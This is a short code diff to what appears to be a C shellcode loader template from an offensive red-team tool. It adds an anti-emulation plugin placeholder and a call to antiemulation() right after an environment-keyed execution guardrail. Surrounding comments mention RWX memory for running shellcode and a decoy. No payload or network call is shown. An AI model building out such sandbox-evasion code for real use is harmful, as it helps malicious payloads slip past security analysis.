@@ -15,6 +15,9 @@ char *supermega_payload;
    * will set it to RWX (safe to run shellcodes, opsec-unsafe)
 */
 
+{{plugin_antiemulation}}
+
+
 int main()
 {
 	// Execution Guardrail: Env Check
@@ -28,6 +31,9 @@ int main()
 	if (mystrcmp(buffer, tocheck) != 0) { 
 		return 6;
 	}
+
+	// Depends on plugin_antiemulation
+	antiemulation();
 
 	// Decoy
 	//WinExec("C:\\windows\\system32\\notepad.exe", 1);
